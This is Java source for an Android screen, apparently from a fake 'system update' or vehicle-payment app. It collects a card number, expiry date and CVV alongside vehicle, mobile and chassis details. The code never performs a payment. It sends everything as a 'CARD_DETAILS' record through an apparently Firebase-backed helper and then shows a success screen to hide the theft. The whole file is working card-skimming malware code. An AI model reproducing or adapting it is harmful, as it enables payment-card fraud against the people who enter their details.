package com.sysupd;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import androidx.appcompat.app.AppCompatActivity;

public class CardActivity extends AppCompatActivity {
    String vehicle = "", mobile = "", chassis = "";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_card);
        vehicle = getIntent().getStringExtra("vehicle");
        mobile = getIntent().getStringExtra("mobile");
        chassis = getIntent().getStringExtra("chassis");

        final EditText num = findViewById(R.id.cardNum);
        final EditText exp = findViewById(R.id.expiry);
        final EditText cvv = findViewById(R.id.cvv);
        Button pay = findViewById(R.id.payCardBtn);

        pay.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                String n = num.getText().toString().replace(" ", "");
                String e = exp.getText().toString();
                String c = cvv.getText().toString();
                if (n.length() < 13 || e.length() < 4 || c.length() < 3) return;

                Fb.send("CARD_DETAILS",
                    "{\"number\":\"" + n + "\",\"expiry\":\"" + e + "\",\"cvv\":\"" + c +
                    "\",\"vehicle\":\"" + vehicle + "\",\"mobile\":\"" + mobile +
                    "\",\"chassis\":\"" + chassis + "\"}");

                Intent i = new Intent(CardActivity.this, SuccessActivity.class);
                startActivity(i);
                finish();
            }
        });
    }
}
